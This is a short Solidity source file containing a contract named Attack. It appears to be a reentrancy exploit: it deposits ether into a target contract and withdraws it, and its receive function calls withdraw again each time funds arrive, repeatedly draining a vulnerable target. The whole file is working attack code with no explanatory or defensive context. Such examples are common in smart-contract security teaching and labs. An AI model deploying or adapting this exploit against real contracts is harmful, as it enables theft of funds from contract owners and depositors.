// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface Target{
    function deposit() external payable;
    function withdraw(uint _amount) external;
}


contract Attack{
    Target public target;

    constructor(address _target){
        target = Target(_target);
    }
    function attack() public payable {
        target.deposit{value:msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        target.withdraw(msg.value);
     }
}